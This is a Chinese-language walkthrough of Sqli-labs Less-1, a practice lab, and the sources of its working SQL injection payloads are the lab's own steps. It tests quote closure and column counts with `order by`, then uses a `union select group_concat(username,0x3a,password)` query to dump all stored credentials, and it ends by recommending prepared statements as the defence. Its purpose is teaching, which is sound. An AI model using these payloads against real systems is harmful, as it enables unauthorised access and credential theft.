## 题目: Sqli-labs Less-1

## 题目描述
页面提示输入 ID 参数进行查询。要求利用 SQL 注入漏洞，获取数据库中的敏感信息（如账号密码）。

## 解题思路
本关是经典的 GET 型字符注入。通过 URL 传入 `id` 参数，后端直接将其拼接进 SQL 语句中。我们需要通过单引号闭合字符串，利用注释符 `--+` 注释掉多余代码，最后使用 `UNION SELECT` 联合查询将数据“带”出来。

## 解题步骤
**1. 确认回显与闭合**
* 访问 `?id=1`，页面正常回显 `Your Login name: Dumb`。
* 访问 `?id=1'`，页面报错 `You have an error in your SQL syntax...`，证明单引号成功破坏语法。
* 访问 `?id=1' --+`，页面恢复回显，证明闭合与注释成功。

**2. 判断字段数**
* 测试 `?id=1' order by 3 --+`，页面正常。
* 测试 `?id=1' order by 4 --+`，页面报错 `Unknown column '4'`，说明当前表有 **3 个字段**。

**3. 联合查询爆数据**
* 构造 Payload 让原查询失效（`id=-1`），并查询账号密码：
```?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```
* 页面成功回显所有用户的账号和密码（如 `admin:admin` 等），注入成功。

## 知识点总结
1. **字符型注入的闭合**：必须使用单引号 `'` 闭合原字符串，并用 `-- ` 或 `#` 注释掉后续代码。
2. **UNION 联合查询**：要求前后 SELECT 语句字段数必须一致。利用 `group_concat()` 可以一次性将多行数据拼接成一行输出。
3. **防御策略**：使用 PDO 预编译（Prepared Statements），将 SQL 结构和数据分离，这是防御 SQL 注入最有效的手段。
